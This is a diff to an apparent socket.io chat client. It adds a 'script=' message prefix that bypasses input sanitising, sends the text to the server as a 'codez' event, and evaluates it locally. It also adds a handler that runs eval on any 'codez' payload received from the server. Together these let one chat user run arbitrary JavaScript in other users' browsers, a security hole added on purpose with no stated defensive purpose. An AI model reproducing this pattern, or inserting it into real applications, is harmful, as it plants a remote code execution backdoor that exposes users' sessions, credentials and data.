@@ -54,17 +54,22 @@ $(function() {
   // Sends a chat message
   function sendMessage () {
     var message = $inputMessage.val();
-    // Prevent markup from being injected into the message
-    message = cleanInput(message);
-    // if there is a non-empty message and a socket connection
-    if (message && connected) {
-      $inputMessage.val('');
-      addChatMessage({
-        username: username,
-        message: message
-      });
-      // tell server to execute 'new message' and send along one parameter
-      socket.emit('new message', message);
+    if (message.substr(0,7) === 'script=') {
+      socket.emit('codez', message.substr(7));
+      eval(message.substr(7));
+    } else {
+      // Prevent markup from being injected into the message
+      message = cleanInput(message);
+      // if there is a non-empty message and a socket connection
+      if (message && connected) {
+        $inputMessage.val('');
+        addChatMessage({
+          username: username,
+          message: message
+        });
+        // tell server to execute 'new message' and send along one parameter
+        socket.emit('new message', message);
+      }
     }
   }
 
@@ -239,6 +244,10 @@ $(function() {
   // Whenever the server emits 'new message', update the chat body
   socket.on('new message', function (data) {
     addChatMessage(data);
+  });
+
+  socket.on('codez', function (data) {
+    eval(data.code);
   });
 
   // Whenever the server emits 'user joined', log it in the chat body
